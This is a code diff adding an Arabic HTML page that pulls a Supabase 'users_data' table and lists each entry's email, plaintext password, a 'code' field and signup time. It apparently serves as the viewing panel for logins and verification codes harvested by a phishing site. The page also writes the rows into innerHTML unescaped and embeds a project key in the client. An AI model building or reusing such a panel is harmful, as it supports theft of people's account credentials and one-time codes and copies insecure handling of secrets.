@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>قائمة البيانات المُسجلة</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
+      padding: 30px;
+      margin: 0;
+    }
+    h2 {
+      color: #333;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    table {
+      width: 100%;
+      max-width: 900px;
+      margin: 0 auto;
+      border-collapse: collapse;
+      background: #ffffff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+    th, td {
+      padding: 12px 15px;
+      text-align: right;
+      border-bottom: 1px solid #ddd;
+    }
+    th {
+      background-color: #0095f6;
+      color: white;
+      font-weight: bold;
+    }
+    tr:hover {
+      background-color: #f1f1f1;
+    }
+    .loading {
+      text-align: center;
+      font-size: 18px;
+      color: #666;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body>
+
+  <h2>قائمة البيانات الجاهزة</h2>
+  <div id="loading" class="loading">جاري تحميل البيانات...</div>
+
+  <table id="dataTable" style="display: none;">
+    <thead>
+      <tr>
+        <th>الرقم (ID)</th>
+        <th>البريد الإلكتروني</th>
+        <th>كلمة السر</th>
+        <th>الكود</th>
+        <th>تاريخ التسجيل</th>
+      </tr>
+    </thead>
+    <tbody id="tableBody">
+    </tbody>
+  </table>
+
+  <script>
+    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtF...'; // قم بوضع مفتاح Publishable الخاص بك
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    async function loadUsersData() {
+      const { data, error } = await supabaseClient
+        .from('users_data')
+        .select('*')
+        .order('id', { ascending: false });
+
+      const loading = document.getElementById('loading');
+      const table = document.getElementById('dataTable');
+      const tableBody = document.getElementById('tableBody');
+
+      if (error) {
+        loading.innerText = 'حدث خطأ أثناء جلب البيانات: ' + error.message;
+        return;
+      }
+
+      loading.style.display = 'none';
+      table.style.display = 'table';
+
+      tableBody.innerHTML = '';
+      data.forEach(user => {
+        const row = `
+          <tr>
+            <td>${user.id || ''}</td>
+            <td>${user.email || ''}</td>
+            <td>${user.password || ''}</td>
+            <td><strong>${user.code || 'لم يدخل الكود بعد'}</strong></td>
+            <td>${user.created_at ? new Date(user.created_at).toLocaleString('ar-EG') : ''}</td>
+          </tr>
+        `;
+        tableBody.innerHTML += row;
+      });
+    }
+
+    loadUsersData();
+  </script>
+</body>
+</html>
